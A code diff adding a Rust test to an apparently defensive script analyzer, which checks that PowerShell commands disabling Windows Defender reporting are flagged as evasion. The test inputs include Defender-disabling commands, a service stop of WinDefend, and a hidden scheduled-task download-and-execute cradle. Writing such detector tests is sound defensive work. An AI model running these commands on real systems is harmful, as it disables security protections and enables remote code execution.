@@ -3083,6 +3083,23 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn set_mppreference_short_reporting_parameters_emit_defender_evasion_traits() {
+        let script = br#"powershell -Command "Set-MpPreference -MAPS 0 -Sub 2""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for action in ["setmp-mapsreporting", "setmp-submitsamplesconsent"] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::DefenderEvasion { action: existing_action, .. } if existing_action == action)),
+                "short Set-MpPreference reporting parameter missed for {action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn powershell_stop_service_name_list_emits_each_defender_evasion_trait() {
         let script = br#"powershell -Command "Stop-Service -Name WinDefend, WdNisSvc -Force""#;
         let report = analyze(script, &AnalyzeConfig::default());
